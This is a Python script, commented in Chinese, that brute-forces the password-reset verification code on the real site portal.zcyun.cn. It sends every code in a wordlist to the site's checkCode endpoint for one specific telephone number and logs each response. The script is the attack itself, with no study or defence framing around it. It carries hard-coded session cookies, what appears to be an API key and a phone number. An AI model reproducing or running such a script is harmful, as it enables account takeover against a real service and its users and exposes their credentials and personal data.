#对portal.zcyun.cn页面下的找回密码的验证码进行爆破

import os
import http.client

file_o = open(os.getcwd() + '\\' + 'back.txt','wb+')
file_num = open(os.getcwd() + '\\' + '123.txt', mode = 'r')
#print(file_num.readline())
url = 'portal.zcyun.cn'
cookie = 'Hm_lvt_cfeb62697b487c023e8c500fa197269f=1483507377,1483669575; JSESSIONID=1A3F9810A33F8C09583B0C82DB480676; Hm_lpvt_cfeb62697b487c023e8c500fa197269f=1483670231; BUS_APIKey=aeb31a0a10db46f5c7aef823e250fad6'
headers_ = {
    'Host': 'portal.zcyun.cn',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'http://portal.zcyun.cn/findPwdPage',
    'Cookie': cookie,
    'Connection': 'close'
}

#print(headers_['Cookie'])
for line in file_num:
    #print(line)
    h1 = http.client.HTTPConnection(url)
    h1.request('GET', '/v2.0/checkCode?valCode=' + line + '&flag=2&telephone=18811392560', body = None, headers = headers_)
    resp = h1.getresponse()
    #print(resp.read())
    #print(resp.read().decode())
    #print(type(resp.read()))     # read()执行完之后，会自动往下走，所以要赋值给变量然后在写入
    file_o.write(resp.read())
    file_o.write(b'\x0d\x0a')

file_o.close()
file_num.close()
